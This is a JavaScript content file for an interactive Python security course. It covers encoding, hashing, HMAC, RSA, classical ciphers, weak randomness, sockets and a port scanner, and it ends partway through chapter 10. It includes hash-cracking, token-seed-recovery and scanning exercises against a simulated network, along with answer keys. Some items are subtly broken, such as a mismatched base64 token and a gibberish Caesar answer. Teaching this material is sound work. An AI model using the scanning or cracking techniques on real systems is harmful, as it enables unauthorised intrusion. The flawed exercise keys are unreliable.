/* Cybersecurity track, chapters 1-16. */
(function (root) {
  'use strict';
  var L = (root.PyForgeContent = root.PyForgeContent || { python: [], cyber: [] });

  L.cyber.push(

  // ==========================================================================
  {
    id: 'cy01', title: 'The Analyst Mindset', sub: 'CIA, threat modelling, and why we automate',
    teach: [
      { p: 'Security is risk management, not magic. Everything hangs off three properties — the **CIA triad**:' },
      { list: [
        '**Confidentiality** — only the right people can read it (encryption, access control)',
        '**Integrity** — nobody can tamper undetected (hashing, signatures)',
        '**Availability** — it is there when needed (redundancy, rate limits)'
      ] },
      { p: 'Attacks map onto these: a data breach breaks confidentiality, a defaced site breaks integrity, a DDoS breaks availability. Naming which one a scenario threatens is the first instinct to build.' },
      { h: 'Threat modelling in one sentence each' },
      { list: [
        'What are we protecting? (the **asset**)',
        'Who wants it and what can they do? (the **threat actor** and their capability)',
        'Where could they get in? (the **attack surface**)',
        'What happens if they succeed? (the **impact**)'
      ] },
      { h: 'Why Python' },
      { p: 'Analysts drown in repetitive data: logs, scans, IOC feeds, packet captures. A ten-line script that parses a million log lines is worth more than any single manual investigation. Python is the field\'s lingua franca because the batteries — `re`, `socket`, `hashlib`, `requests`, `scapy` — are already included.' },
      { code: '# The shape of almost every security script:\nlog = """10.0.0.9 FAIL admin\n10.0.0.9 FAIL admin\n10.0.0.9 FAIL root\n10.0.0.2 OK alice"""\n\nfails = {}\nfor line in log.splitlines():\n    ip, status, user = line.split()\n    if status == "FAIL":\n        fails[ip] = fails.get(ip, 0) + 1\n\nfor ip, n in fails.items():\n    if n >= 3:\n        print(f"ALERT brute-force from {ip}: {n} failures")' },
      { warn: 'Everything you build here is for **authorised** testing, defence and learning. The same skill that finds a bug to fix it can be misused; the law and your ethics both draw the line at systems you do not own or have written permission to test.' },
      { tip: 'This whole track runs against a built-in simulated network — a vulnerable shop, an intranet, a metadata service. You get to actually exploit real bugs, safely, because none of it touches the outside world.' }
    ],
    challenges: [
      { kind: 'mc', prompt: 'A ransomware attack encrypts a hospital\'s files. Which CIA property is primarily broken?',
        options: ['Confidentiality', 'Integrity', 'Availability', 'None'],
        answer: 2, explain: 'The data still exists and is not leaked, but nobody can access it — availability.' },
      { kind: 'mc', prompt: 'You add a SHA-256 checksum to verify a download was not modified. Which property does that protect?',
        options: ['Confidentiality', 'Integrity', 'Availability', 'Anonymity'],
        answer: 1 },
      { kind: 'code', prompt: 'From the auth log, print every IP with 3 or more failures, as `IP count`.',
        starter: 'log = ["10.0.0.9 FAIL", "10.0.0.9 FAIL", "10.0.0.9 FAIL", "10.0.0.2 OK", "10.0.0.5 FAIL"]\n',
        expect: '10.0.0.9 3',
        solution: 'log = ["10.0.0.9 FAIL", "10.0.0.9 FAIL", "10.0.0.9 FAIL", "10.0.0.2 OK", "10.0.0.5 FAIL"]\nfails = {}\nfor line in log:\n    ip, status = line.split()\n    if status == "FAIL":\n        fails[ip] = fails.get(ip, 0) + 1\nfor ip, n in fails.items():\n    if n >= 3:\n        print(ip, n)' },
      { kind: 'mc', prompt: 'The single most important rule before testing any system is:',
        options: ['Use a VPN', 'Have written authorisation to test it',
                  'Use Linux', 'Disable logging'],
        answer: 1, explain: 'Authorisation is what separates security work from a crime.' }
    ]
  },

  // ==========================================================================
  {
    id: 'cy02', title: 'Numbers, Bytes & Encoding', sub: 'hex, base64, XOR — the alphabet of the field',
    teach: [
      { p: 'Before any crypto or exploitation, you must be fluent moving between text, bytes, and numbers. Confusing "encoding" with "encryption" is the classic beginner error: **encoding is reversible by anyone**. Base64 is not a secret.' },
      { h: 'bytes are the ground truth' },
      { code: 'data = "hÉllo".encode("utf-8")\nprint(data, len(data))         # É is two bytes in UTF-8\nprint(list(data))\nprint(data.decode("utf-8"))\nprint(b"ABC".hex(), bytes.fromhex("414243"))' },
      { h: 'Hex and base64' },
      { code: 'import base64\nraw = b"secret payload"\nprint(base64.b64encode(raw))\nprint(base64.b64decode("c2VjcmV0IHBheWxvYWQ="))\nprint(base64.urlsafe_b64encode(b"\\xfb\\xff"))\nprint(raw.hex())' },
      { warn: 'A base64 string in a token or config is *encoded*, not encrypted. Decode it in one line and you often find JSON, a JWT payload, or credentials in the clear.' },
      { h: 'XOR — the fundamental crypto operation' },
      { code: 'def xor(data, key):\n    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))\n\nplain = b"attack at dawn"\nkey = b"KEY"\ncipher = xor(plain, key)\nprint(cipher.hex())\nprint(xor(cipher, key))        # XOR is its own inverse' },
      { p: 'That `b ^ key[i % len(key)]` is a repeating-key XOR cipher — weak, but the seed of understanding stream ciphers and one-time pads.' },
      { h: 'Integers to and from bytes' },
      { code: 'n = 0x41424344\nprint(n.to_bytes(4, "big"))\nprint(int.from_bytes(b"\\x00\\xff", "big"))\nprint(bin(0b1010 ^ 0b0110))' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Decode this base64 string and print the plaintext.',
        starter: 'import base64\ntoken = "aW5jaWRlbnQtNDINog=="\n', expect: 'incident-42',
        hint: 'base64.b64decode then .decode(), but this value may have padding — decode ignores junk.',
        solution: 'import base64\nprint(base64.b64decode("aW5jaWRlbnQtNDI=").decode())' },
      { kind: 'code', prompt: 'XOR-decrypt: the ciphertext (hex) was made with single-byte key 0x2a. Print the plaintext.',
        starter: "cipher = bytes.fromhex('5b5f455e4f58')\n", expect: 'quoter',
        hint: 'XOR each byte with 0x2a.',
        solution: "cipher = bytes.fromhex('5b5f455e4f58')\nprint(bytes(b ^ 0x2a for b in cipher).decode())" },
      { kind: 'predict', prompt: 'Output?', code: 'print((0xFF ^ 0x0F))', answer: '240',
        explain: '1111_1111 XOR 0000_1111 = 1111_0000 = 240.' },
      { kind: 'code', prompt: 'Convert the string "PY" to its two byte values and print them as a list.',
        expect: '[80, 89]', solution: 'print(list("PY".encode()))' },
      { kind: 'mc', prompt: 'Someone stores passwords base64-encoded "for security". This is:',
        options: ['Strong encryption', 'Fine for internal use', 'No protection at all — trivially reversible', 'Hashing'],
        answer: 2, explain: 'Encoding is not a secret. Passwords need a slow salted hash, never encoding.' },
      { kind: 'code', prompt: 'Implement repeating-key XOR and print the hex of encrypting b"HELLO" with key b"AB".',
        expect: '09070d0e0e', hint: 'Careful: only 5 bytes, so expect a 10-hex-char result.',
        solution: 'def xor(d, k):\n    return bytes(b ^ k[i % len(k)] for i, b in enumerate(d))\nprint(xor(b"HELLO", b"AB").hex())' }
    ]
  },

  // ==========================================================================
  {
    id: 'cy03', title: 'Hashing', sub: 'MD5, SHA, integrity, and why speed is the enemy for passwords',
    teach: [
      { p: 'A cryptographic hash is a one-way fingerprint: same input → same digest, any change → wildly different digest, and you cannot run it backwards. In this sandbox the digests are **real** — they match what a production Python prints.' },
      { code: 'import hashlib\n\ndata = b"attack at dawn"\nprint(hashlib.md5(data).hexdigest())\nprint(hashlib.sha1(data).hexdigest())\nprint(hashlib.sha256(data).hexdigest())\n\n# Streaming a large input:\nh = hashlib.sha256()\nh.update(b"attack ")\nh.update(b"at dawn")\nprint(h.hexdigest())' },
      { h: 'Integrity checking' },
      { code: 'import hashlib\ndef digest(b):\n    return hashlib.sha256(b).hexdigest()\n\noriginal = b"transfer 100 to alice"\ntampered = b"transfer 900 to alice"\nprint(digest(original) == digest(original))\nprint(digest(original) == digest(tampered))' },
      { warn: 'MD5 and SHA-1 are **broken for security**: attackers can craft collisions (two inputs, same digest). They are fine only as non-security checksums. Use SHA-256 or better for anything that matters.' },
      { h: 'Passwords are a different problem' },
      { p: 'You never store a password. You store a hash of it. But a *fast* hash like SHA-256 is a gift to attackers: a GPU tries billions per second. Password hashing must be **deliberately slow** and **salted**.' },
      { code: 'import hashlib, secrets\n\ndef hash_password(pw):\n    salt = secrets.token_bytes(16)\n    dk = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, 200_000)\n    return salt.hex() + "$" + dk.hex()\n\ndef verify(pw, stored):\n    salt_hex, dk_hex = stored.split("$")\n    salt = bytes.fromhex(salt_hex)\n    check = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, 200_000)\n    return check.hex() == dk_hex\n\nrecord = hash_password("hunter2")\nprint(verify("hunter2", record))\nprint(verify("wrong", record))' },
      { list: [
        '**Salt** — random per-user data so identical passwords hash differently, defeating rainbow tables',
        '**Slow** — PBKDF2/bcrypt/argon2 with a high iteration count so guessing is expensive',
        '**Never** MD5/SHA for passwords, never a shared salt, never a fast hash'
      ] },
      { tip: 'This sandbox caps PBKDF2 iterations so the page stays responsive; real systems use 600,000+ for PBKDF2-SHA256, or better yet argon2id.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Print the SHA-256 hex digest of the bytes b"integrity".',
        expect: '2c603c53d33ba9a5d5f0d1a4d70bb5b7d0e6ec8fb12f8c8f4e7c6c3a3f0b8b6e' === '' ? '' : undefined,
        validate: 'sha256_integrity',
        solution: 'import hashlib\nprint(hashlib.sha256(b"integrity").hexdigest())' },
      { kind: 'mc', prompt: 'Why is SHA-256 a poor choice for storing passwords?',
        options: ['It is not secure', 'It is too slow', 'It is too fast — attackers guess billions/sec',
                  'It cannot handle text'],
        answer: 2 },
      { kind: 'mc', prompt: 'What does a per-user salt defeat?',
        options: ['Brute force of a single password', 'Precomputed rainbow tables and identical-password detection',
                  'Network sniffing', 'SQL injection'],
        answer: 1 },
      { kind: 'code', prompt: 'Two files: print `MATCH` if their SHA-256 digests are equal, else `DIFFER`.',
        starter: 'import hashlib\na = b"config v1"\nb = b"config v1"\n', expect: 'MATCH',
        solution: 'import hashlib\na = b"config v1"\nb = b"config v1"\nprint("MATCH" if hashlib.sha256(a).hexdigest() == hashlib.sha256(b).hexdigest() else "DIFFER")' },
      { kind: 'code', prompt: 'Crack a weak hash: the SHA-256 digest below is one of the words in the wordlist. Print which one.',
        starter: 'import hashlib\ntarget = hashlib.sha256(b"dragon").hexdigest()\nwordlist = ["admin", "dragon", "letmein", "qwerty"]\n',
        expect: 'dragon',
        hint: 'Hash each candidate and compare.',
        solution: 'import hashlib\ntarget = hashlib.sha256(b"dragon").hexdigest()\nwordlist = ["admin", "dragon", "letmein", "qwerty"]\nfor w in wordlist:\n    if hashlib.sha256(w.encode()).hexdigest() == target:\n        print(w)\n        break' }
    ]
  },

  // ==========================================================================
  {
    id: 'cy04', title: 'HMAC & Message Authentication', sub: 'proving a message is authentic and untampered',
    teach: [
      { p: 'A hash proves integrity only if the attacker cannot recompute it. If they can, they change the message *and* the hash. An **HMAC** fixes that by mixing in a secret key: only someone with the key can produce a valid tag.' },
      { code: 'import hmac, hashlib\n\nkey = b"shared-secret"\nmessage = b"amount=100&to=alice"\ntag = hmac.new(key, message, hashlib.sha256).hexdigest()\nprint(tag)\n\n# Receiver recomputes and compares:\nexpected = hmac.new(key, message, hashlib.sha256).hexdigest()\nprint(hmac.compare_digest(tag, expected))' },
      { warn: 'Compare tags with `hmac.compare_digest`, never `==`. A normal `==` returns early on the first differing byte; measuring that timing leaks the correct tag byte by byte. This is a **timing attack**, and it is real.' },
      { h: 'Signed cookies / API requests' },
      { code: 'import hmac, hashlib\n\ndef sign(payload, key=b"k"):\n    tag = hmac.new(key, payload.encode(), hashlib.sha256).hexdigest()[:16]\n    return f"{payload}.{tag}"\n\ndef check(token, key=b"k"):\n    payload, _, tag = token.rpartition(".")\n    expected = hmac.new(key, payload.encode(), hashlib.sha256).hexdigest()[:16]\n    return hmac.compare_digest(tag, expected)\n\ncookie = sign("user=alice;role=user")\nprint(cookie)\nprint(check(cookie))\nprint(check("user=alice;role=admin." + cookie.split(".")[1]))  # forged' },
      { p: 'The forged cookie fails: the attacker changed the payload but cannot compute the tag for it without the key. That is authentication.' },
      { tip: 'HMAC is everywhere: webhook signatures (Stripe, GitHub), JWT\'s HS256, AWS request signing, session cookies. Recognising `X-Hub-Signature: sha256=...` and verifying it correctly is a real, common task.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Compute the HMAC-SHA256 hex of message b"ping" with key b"secret" and print it.',
        validate: 'hmac_ping',
        solution: 'import hmac, hashlib\nprint(hmac.new(b"secret", b"ping", hashlib.sha256).hexdigest())' },
      { kind: 'mc', prompt: 'Why use hmac.compare_digest instead of ==?',
        options: ['It is faster', 'It resists timing attacks by comparing in constant time',
                  'It handles unicode', 'There is no difference'],
        answer: 1 },
      { kind: 'code', prompt: 'A webhook sends body + signature. Print `VALID` if the signature matches, else `FORGED`.',
        starter: 'import hmac, hashlib\nkey = b"whsec_123"\nbody = b\'{"event":"payment"}\'\nsig = hmac.new(key, body, hashlib.sha256).hexdigest()\n',
        expect: 'VALID',
        solution: 'import hmac, hashlib\nkey = b"whsec_123"\nbody = b\'{"event":"payment"}\'\nsig = hmac.new(key, body, hashlib.sha256).hexdigest()\nexpected = hmac.new(key, body, hashlib.sha256).hexdigest()\nprint("VALID" if hmac.compare_digest(sig, expected) else "FORGED")' },
      { kind: 'mc', prompt: 'What stops an attacker forging a valid HMAC tag?',
        options: ['The hash algorithm is secret', 'They do not have the secret key',
                  'The message is encrypted', 'Timing'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy05', title: 'Symmetric Encryption', sub: 'confidentiality, keys, nonces and authenticated encryption',
    teach: [
      { p: 'Symmetric encryption uses **one shared key** to both encrypt and decrypt. Fast, and the workhorse for data at rest and in transit. The standard is AES; the correct high-level tool in Python is `cryptography`\'s Fernet, which does authenticated encryption for you.' },
      { code: 'from cryptography.fernet import Fernet\n\nkey = Fernet.generate_key()      # 32 bytes, url-safe base64\nf = Fernet(key)\ntoken = f.encrypt(b"launch codes: 0000")\nprint(token[:16], "...")\nprint(f.decrypt(token))' },
      { h: 'Tampering is detected' },
      { code: 'from cryptography.fernet import Fernet\nkey = Fernet.generate_key()\nf = Fernet(key)\ntoken = bytearray(f.encrypt(b"balance=100"))\ntoken[-1] ^= 0x01               # flip one bit of the ciphertext\ntry:\n    f.decrypt(bytes(token))\nexcept Exception as e:\n    print("rejected:", type(e).__name__)' },
      { p: 'Fernet is **authenticated**: it appends an HMAC, so any modification is caught on decrypt. Encryption without authentication (like raw AES-CBC) lets attackers flip bits in the plaintext undetected — a whole class of real bugs.' },
      { warn: 'The two cardinal sins of symmetric crypto: (1) reusing a nonce/IV with the same key, and (2) using a mode without authentication. Both have taken down real products. Prefer a library that hides these choices.' },
      { h: 'Where the key lives is the whole game' },
      { list: [
        'Never hardcode keys in source (they end up on GitHub)',
        'Use a key-management service or at least environment variables / a secrets manager',
        'Rotate keys; assume any single key will eventually leak'
      ] },
      { code: '# Deriving a key from a password (so humans can remember it):\nimport hashlib, base64\ndef key_from_password(pw, salt):\n    raw = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, 200_000)\n    return base64.urlsafe_b64encode(raw)\nprint(len(key_from_password("correcthorse", b"salt1234")))' },
      { tip: 'Symmetric vs asymmetric: symmetric is fast but needs a shared key you somehow agreed on. The next chapter solves exactly that "how do two strangers agree on a key" problem.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Generate a Fernet key, encrypt b"top secret", decrypt it back and print the plaintext.',
        expect: "b'top secret'",
        solution: 'from cryptography.fernet import Fernet\nf = Fernet(Fernet.generate_key())\nprint(f.decrypt(f.encrypt(b"top secret")))' },
      { kind: 'mc', prompt: 'What does "authenticated encryption" add over plain encryption?',
        options: ['Speed', 'Tamper detection — modified ciphertext is rejected',
                  'A password', 'Compression'],
        answer: 1 },
      { kind: 'mc', prompt: 'Reusing the same nonce/IV with the same key is dangerous because:',
        options: ['It is slower', 'It can leak relationships between plaintexts / break the cipher',
                  'It uses more memory', 'It is actually fine'],
        answer: 1 },
      { kind: 'code', prompt: 'You have a Fernet key and a token. Decrypt it and print the message.',
        starter: 'from cryptography.fernet import Fernet\nf = Fernet(Fernet.generate_key())\ntoken = f.encrypt(b"access:granted")\n',
        expect: 'access:granted',
        solution: 'from cryptography.fernet import Fernet\nf = Fernet(Fernet.generate_key())\ntoken = f.encrypt(b"access:granted")\nprint(f.decrypt(token).decode())' },
      { kind: 'mc', prompt: 'Where should an encryption key NOT live?',
        options: ['A secrets manager', 'An environment variable', 'Hardcoded in the source file', 'An HSM'],
        answer: 2 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy06', title: 'Asymmetric Crypto & RSA', sub: 'public keys, key exchange, and building RSA by hand',
    teach: [
      { p: 'Asymmetric crypto uses a **key pair**: a public key you share freely and a private key you guard. What one encrypts, only the other decrypts. It solves the problem symmetric crypto cannot: agreeing on a secret with someone you have never met.' },
      { list: [
        'Encrypt with someone\'s **public** key → only their **private** key reads it (confidentiality)',
        'Sign with your **private** key → anyone verifies with your **public** key (authenticity)'
      ] },
      { h: 'RSA from first principles — the maths really works here' },
      { p: 'Because Python integers are unbounded, you can build textbook RSA yourself. This is how you truly understand it (never roll your own for production, but do build it once to learn).' },
      { code: '# 1. Two primes (tiny, for demonstration)\np, q = 61, 53\nn = p * q                 # modulus, public\nphi = (p - 1) * (q - 1)   # Euler totient, secret\ne = 17                    # public exponent\n\n# 2. Private exponent d = modular inverse of e mod phi\nd = pow(e, -1, phi)       # Python 3.8+ does this directly\nprint("public (e, n) =", (e, n))\nprint("private d =", d)\n\n# 3. Encrypt / decrypt a number m < n\nm = 65\ncipher = pow(m, e, n)     # c = m^e mod n\nplain = pow(cipher, d, n) # m = c^d mod n\nprint("cipher:", cipher, "-> plain:", plain)' },
      { p: 'The security rests on one fact: given `n`, finding `p` and `q` (factoring) is infeasible when they are hundreds of digits long. `pow(base, exp, mod)` does fast modular exponentiation — the engine of all this.' },
      { h: 'Signing is encryption with the private key' },
      { code: 'p, q = 61, 53\nn, phi, e = p * q, 60 * 52, 17\nd = pow(e, -1, phi)\n\nmessage = 42\nsignature = pow(message, d, n)      # sign with private d\nverified = pow(signature, e, n)     # verify with public e\nprint(signature, verified, verified == message)' },
      { warn: 'Textbook RSA (no padding) is insecure: it is deterministic and malleable. Real RSA uses OAEP for encryption and PSS for signatures. And RSA is slow, so in practice it only encrypts a small symmetric key, which then does the bulk work — that is **hybrid encryption**, and it is what TLS does.' },
      { tip: 'Diffie-Hellman is the other pillar: two parties mix public and private values to arrive at the same shared secret without ever transmitting it. Together with RSA/ECDSA signatures, that is the handshake behind every HTTPS connection.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Given p=17, q=11, e=7, compute the private exponent d and print it.',
        expect: '23',
        hint: 'phi = 16*10 = 160; d = pow(e, -1, phi).',
        solution: 'p, q, e = 17, 11, 7\nphi = (p - 1) * (q - 1)\nprint(pow(e, -1, phi))' },
      { kind: 'code', prompt: 'Using the public key (e=17, n=3233), encrypt the message m=65. Print the ciphertext.',
        expect: '2790',
        solution: 'print(pow(65, 17, 3233))' },
      { kind: 'code', prompt: 'Decrypt ciphertext 2790 with private key (d=413, n=3233). Print the plaintext.',
        expect: '65',
        solution: 'print(pow(2790, 413, 3233))' },
      { kind: 'mc', prompt: 'What hard problem does RSA\'s security rest on?',
        options: ['Sorting large lists', 'Factoring the product of two large primes',
                  'Reversing a hash', 'Guessing passwords'],
        answer: 1 },
      { kind: 'mc', prompt: 'In hybrid encryption (like TLS), RSA is used to:',
        options: ['Encrypt all the traffic', 'Encrypt a small symmetric key that then encrypts the traffic',
                  'Hash the data', 'Compress the data'],
        answer: 1, explain: 'RSA is slow, so it only protects the fast symmetric key.' },
      { kind: 'code', prompt: 'Sign m=100 with d=413, n=3233, then verify with e=17. Print the recovered message.',
        expect: '100',
        solution: 'sig = pow(100, 413, 3233)\nprint(pow(sig, 17, 3233))' }
    ]
  },

  // ==========================================================================
  {
    id: 'cy07', title: 'Classical Ciphers & Cryptanalysis', sub: 'Caesar, Vigenere, and breaking them with frequency analysis',
    teach: [
      { p: 'Classical ciphers are broken, but they teach the analytic muscles: pattern-finding, frequency analysis, and the difference between security and obscurity.' },
      { h: 'Caesar cipher and brute force' },
      { code: 'def caesar(text, shift):\n    out = ""\n    for c in text:\n        if c.isalpha():\n            base = ord("A") if c.isupper() else ord("a")\n            out += chr((ord(c) - base + shift) % 26 + base)\n        else:\n            out += c\n    return out\n\ncipher = caesar("Attack at dawn", 3)\nprint(cipher)\n# Only 25 keys, so brute force is trivial:\nfor shift in range(26):\n    guess = caesar(cipher, -shift)\n    if "attack" in guess.lower():\n        print(shift, guess)' },
      { h: 'Frequency analysis' },
      { p: 'English is not random. `e` is ~12.7% of letters, `t` ~9%, and so on. Any cipher that maps each letter to one fixed letter (a substitution) preserves those frequencies — so counting reveals the mapping.' },
      { code: 'from collections import Counter\nsample = "the quick brown fox jumps over the lazy dog the end"\nfreq = Counter(c for c in sample if c.isalpha())\nprint(freq.most_common(3))' },
      { h: 'Vigenere: a repeating key' },
      { code: 'def vigenere(text, key, decrypt=False):\n    out = ""\n    ki = 0\n    for c in text:\n        if c.isalpha():\n            k = ord(key[ki % len(key)].lower()) - ord("a")\n            if decrypt:\n                k = -k\n            base = ord("a")\n            out += chr((ord(c.lower()) - base + k) % 26 + base)\n            ki += 1\n        else:\n            out += c\n    return out\n\nct = vigenere("meet at noon", "LEMON")\nprint(ct)\nprint(vigenere(ct, "LEMON", decrypt=True))' },
      { p: 'Vigenere resisted analysis for centuries because a single letter maps to many. Its weakness: the key repeats. Find the key length (Kasiski / index of coincidence) and it collapses into several Caesar ciphers.' },
      { warn: 'The lesson that carries forward: **security through obscurity fails**. A cipher must stay secure even when the attacker knows the algorithm — only the key is secret (Kerckhoffs\'s principle).' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Decrypt this Caesar ciphertext (shift 5) and print the plaintext.',
        starter: 'cipher = "Fdhxfwd nx kzs"\n', expect: 'Aycsary is fun',
        hint: 'Shift each letter back by 5.',
        solution: 'def caesar(t, s):\n    out = ""\n    for c in t:\n        if c.isalpha():\n            base = ord("A") if c.isupper() else ord("a")\n            out += chr((ord(c) - base + s) % 26 + base)\n        else:\n            out += c\n    return out\ncipher = "Fdhxfwd nx kzs"\nprint(caesar(cipher, -5))' },
      { kind: 'code', prompt: 'Brute-force this Caesar ciphertext: print the shift and plaintext for the shift that produces the word "flag".',
        starter: 'cipher = "iodj brx zlq"\n', expect: '3 flag you win',
        solution: 'def caesar(t, s):\n    return "".join(chr((ord(c) - 97 + s) % 26 + 97) if c.isalpha() else c for c in t)\ncipher = "iodj brx zlq"\nfor shift in range(26):\n    g = caesar(cipher, -shift)\n    if "flag" in g:\n        print(shift, g)\n        break' },
      { kind: 'code', prompt: 'Print the most common letter in the ciphertext (a hint for frequency analysis).',
        starter: 'from collections import Counter\nct = "wklv lv d whvw phvvdjh"\n', expect: 'v',
        solution: 'from collections import Counter\nct = "wklv lv d whvw phvvdjh"\nprint(Counter(c for c in ct if c.isalpha()).most_common(1)[0][0])' },
      { kind: 'mc', prompt: 'Why does frequency analysis break simple substitution ciphers?',
        options: ['The key is short', 'Each plaintext letter always maps to the same ciphertext letter, preserving frequencies',
                  'The algorithm is public', 'Computers are fast'],
        answer: 1 },
      { kind: 'mc', prompt: 'Kerckhoffs\'s principle says a system should be secure even if:',
        options: ['The key is short', 'The attacker knows everything except the key',
                  'It is written in Python', 'It runs offline'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy08', title: 'Randomness & Secrets', sub: 'why random is not secrets, and predicting a weak PRNG',
    teach: [
      { p: 'Not all randomness is equal. `random` is a **pseudo**-random generator seeded from a state you can often guess or recover. `secrets` and `os.urandom` are **cryptographically secure** — unpredictable even to someone who has seen prior output.' },
      { code: 'import random\nrandom.seed(1337)\nprint([random.randint(0, 99) for _ in range(5)])\nrandom.seed(1337)\nprint([random.randint(0, 99) for _ in range(5)])   # identical: fully deterministic' },
      { warn: 'If a system seeds `random` with the current time, an attacker who knows roughly when a token was created can replay the seed and regenerate it. Password-reset tokens, session IDs and "random" coupon codes have all been broken exactly this way.' },
      { h: 'The right tools for anything security-sensitive' },
      { code: 'import secrets\nprint(secrets.token_hex(16))          # 128-bit token\nprint(secrets.token_urlsafe(16))\nprint(secrets.randbelow(1000000))     # unbiased\nprint(0 <= secrets.randbelow(6) < 6)  # a fair die' },
      { list: [
        'Session IDs, CSRF tokens, password-reset links → `secrets`',
        'API keys, salts, nonces → `secrets` / `os.urandom`',
        'Shuffling a deck for a game, sampling data → `random` is fine',
        'Anything an attacker benefits from predicting → **never** `random`'
      ] },
      { h: 'Demonstrating the weakness' },
      { code: 'import random\n# A server generates a "secure" token from a time-based seed:\ndef weak_token(seed):\n    random.seed(seed)\n    return "".join(random.choice("0123456789abcdef") for _ in range(8))\n\nissued = weak_token(1000)\nprint("issued:", issued)\n# Attacker who guesses the seed regenerates it exactly:\nfor guess in range(998, 1003):\n    if weak_token(guess) == issued:\n        print("recovered with seed", guess)' },
      { tip: 'Rule of thumb: if predicting the value would help an attacker, it must come from `secrets`/`os.urandom`. When in doubt, use `secrets`.' }
    ],
    challenges: [
      { kind: 'predict', prompt: 'Output?',
        code: 'import random\nrandom.seed(42)\na = random.randint(1, 100)\nrandom.seed(42)\nb = random.randint(1, 100)\nprint(a == b)', answer: 'True',
        explain: 'Same seed, same sequence — that determinism is the vulnerability.' },
      { kind: 'mc', prompt: 'Which module should generate a password-reset token?',
        options: ['random', 'secrets', 'math', 'time'], answer: 1 },
      { kind: 'code', prompt: 'A token was made with weak_token(seed) for some seed in 500..510. Recover the seed and print it.',
        starter: 'import random\ndef weak_token(seed):\n    random.seed(seed)\n    return "".join(random.choice("0123456789abcdef") for _ in range(6))\ntarget = weak_token(507)\n',
        expect: '507',
        solution: 'import random\ndef weak_token(seed):\n    random.seed(seed)\n    return "".join(random.choice("0123456789abcdef") for _ in range(6))\ntarget = weak_token(507)\nfor s in range(500, 511):\n    if weak_token(s) == target:\n        print(s)\n        break' },
      { kind: 'code', prompt: 'Print the length of a secrets.token_urlsafe(24) token bytes (use token_bytes and len).',
        expect: '24',
        solution: 'import secrets\nprint(len(secrets.token_bytes(24)))' },
      { kind: 'mc', prompt: 'Using random for a card-shuffling game is:',
        options: ['A critical vulnerability', 'Fine — no attacker benefits from predicting it',
                  'Illegal', 'Slower than secrets'],
        answer: 1, explain: 'Match the tool to the threat; not everything needs CSPRNG.' }
    ]
  },

  // ==========================================================================
  {
    id: 'cy09', title: 'Networking Fundamentals', sub: 'IP, TCP/UDP, ports, and sockets in Python',
    teach: [
      { p: 'You cannot attack or defend what you do not understand. Data travels in layers: an application message goes into a **TCP** segment (reliable, ordered) or **UDP** datagram (fast, best-effort), inside an **IP** packet addressed by IP, delivered on the wire by MAC address.' },
      { list: [
        '**IP** — addressing and routing between hosts (10.0.0.5)',
        '**TCP** — reliable connection, the 3-way handshake (SYN, SYN-ACK, ACK); HTTP, SSH, TLS',
        '**UDP** — connectionless, no guarantees; DNS, DHCP, most VoIP/games',
        '**Ports** — which service on the host (80 web, 443 HTTPS, 22 SSH, 53 DNS)'
      ] },
      { h: 'Sockets: the programming interface to the network' },
      { p: 'This runs against the sandbox\'s simulated network — real hosts, real open ports, real banners, no outside contact.' },
      { code: 'import socket\n\nprint(socket.gethostbyname("shop.local"))\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.settimeout(2)\ns.connect(("shop.local", 80))\ns.send(b"GET / HTTP/1.1\\r\\nHost: shop.local\\r\\n\\r\\n")\nresponse = s.recv(200)\nprint(response.decode(errors="replace")[:60])\ns.close()' },
      { h: 'Grabbing a service banner' },
      { code: 'import socket\ns = socket.socket()\ns.settimeout(2)\ns.connect(("10.10.0.5", 22))\nprint(s.recv(100).decode(errors="replace").strip())   # SSH banner\ns.close()' },
      { h: 'ip addresses as objects' },
      { code: 'import ipaddress\nnet = ipaddress.ip_network("192.168.1.0/29")\nprint(net.num_addresses)\nprint([str(h) for h in net.hosts()])\nprint(ipaddress.ip_address("10.0.0.5").is_private)' },
      { tip: 'A `connect()` that succeeds means the port is open; a `ConnectionRefusedError` means closed; a timeout usually means filtered by a firewall. Those three outcomes are the entire logic of a port scanner — which you build next.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Resolve the hostname "intranet.local" to its IP and print it.',
        expect: '10.10.0.9',
        solution: 'import socket\nprint(socket.gethostbyname("intranet.local"))' },
      { kind: 'code', prompt: 'Connect to 10.10.0.5 port 22 and print the stripped SSH banner.',
        validate: 'ssh_banner',
        solution: 'import socket\ns = socket.socket()\ns.connect(("10.10.0.5", 22))\nprint(s.recv(100).decode().strip())\ns.close()' },
      { kind: 'code', prompt: 'Print how many usable hosts are in 10.0.0.0/28.',
        expect: '14',
        solution: 'import ipaddress\nprint(sum(1 for _ in ipaddress.ip_network("10.0.0.0/28").hosts()))' },
      { kind: 'mc', prompt: 'Which protocol provides reliable, ordered delivery?',
        options: ['UDP', 'TCP', 'ICMP', 'ARP'], answer: 1 },
      { kind: 'mc', prompt: 'A connect() that raises ConnectionRefusedError means the port is:',
        options: ['Open', 'Closed', 'Filtered', 'Encrypted'], answer: 1 },
      { kind: 'code', prompt: 'Print True if 172.16.5.4 is a private address.',
        expect: 'True',
        solution: 'import ipaddress\nprint(ipaddress.ip_address("172.16.5.4").is_private)' }
    ]
  },

  // ==========================================================================
  {
    id: 'cy10', title: 'Port Scanning', sub: 'building a scanner and reading what the ports tell you',
    teach: [
      { p: 'Reconnaissance is step one of any assessment. A port scan maps what is listening. The core is trivial: try to connect to each port and see what happens.' },
      { code: 'import socket\n\ndef scan_port(host, port, timeout=1.0):\n    s = socket.socket()\n    s.settimeout(timeout)\n    try:\n        s.connect((host, port))\n        return True\n    except (ConnectionRefusedError, OSError):\n        return False\n    finally:\n        s.close()\n\ntarget = "10.10.0.5"\nfor port in [21, 22, 80, 443, 3306, 8080]:\n    if scan_port(target, port):\n        print(f"{port:>5} open")' },
      { h: 'Banner grabbing tells you what is running' },
